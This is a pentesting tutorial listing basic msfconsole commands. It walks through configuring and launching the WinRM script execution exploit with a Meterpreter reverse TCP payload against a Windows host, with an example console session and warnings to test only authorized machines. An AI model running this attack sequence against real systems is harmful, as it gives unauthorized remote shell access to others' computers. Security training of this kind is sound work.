# Metasploit Framework Basic Commands

## Overview
This document contains terminal-based commands and usage examples for Metasploit Framework (`msfconsole`) to assist with penetration testing tasks.

---

## Commands and Usage

```
# Launch Metasploit Console
msfconsole
```

# Purpose:
# Starts the Metasploit interactive console.
# Note: Ensure Metasploit is installed (typically at /usr/share/metasploit-framework)

# Show Available Payloads
```
show payloads
```
# Purpose:
# Lists all available payloads in the current module context.
# Example: windows/meterpreter/reverse_tcp

# Show Available Exploits
```
show exploits
```
# Purpose:
# Lists all exploit modules.
# Note: 'show exploit' (singular) may work on older versions,
# but 'show exploits' is standard and preferred.

# Select WinRM Exploit
```
use exploit/windows/winrm/winrm_script_exec
```

# Purpose:
# Selects the WinRM Script Execution exploit for Windows systems.
# Location: /usr/share/metasploit-framework/modules/exploits/windows/winrm/

# Show Exploit Information
```
show info
```

# Purpose:
# Displays detailed information about the selected exploit,
# including author, platform, references, and payloads supported.

# Show Exploit Options
```
show options
```
# Purpose:
# Displays required and optional configuration values
# such as RHOSTS (target IP) and LHOST (attacker IP).

# Set Local Host IP
```
set LHOST 192.<local_ip>
```
# Purpose:
# Specifies attacker's IP address for reverse connections.
# Replace <local_ip> with actual IP (use `ip a` or `ifconfig` to find it).

# Set Remote Host IP
```
set RHOST 192.<target_ip>
```
# Purpose:
# Sets the target system's IP address.
# Replace <target_ip> with the actual IP of the system being tested.
# Warning: Only test machines you are authorized to assess.

# Set Payload
```
set PAYLOAD windows/meterpreter/reverse_tcp
```
# Purpose:
# Defines the payload used during exploitation.
# Must be compatible with the chosen exploit.

# Launch the Exploit
```
exploit
```
# Purpose:
# Executes the configured exploit with the selected options and payload.
# You may also use 'run' as an alias.

```
msfconsole
msf6 > show exploits
msf6 > use exploit/windows/winrm/winrm_script_exec
msf6 exploit(windows/winrm/winrm_script_exec) > show info
msf6 exploit(windows/winrm/winrm_script_exec) > show options
msf6 exploit(windows/winrm/winrm_script_exec) > set LHOST 192.168.1.100
msf6 exploit(windows/winrm/winrm_script_exec) > set RHOST 192.168.1.150
msf6 exploit(windows/winrm/winrm_script_exec) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/winrm/winrm_script_exec) > exploit
```
### best practice


# Ensure Exploit Compatibility
# - Use 'show info' to confirm the exploit matches the target system.

# Handle IPs Securely
# - Avoid sharing real IPs in public files.
# - Use placeholders like <local_ip> or <target_ip> in notes.

# Permissions
# - Only run exploits on authorized test machines.

# Keep Metasploit Updated
```
msfupdate
```
# Choose Payloads Wisely
# - Use 'show payloads' to find compatible ones for the exploit.
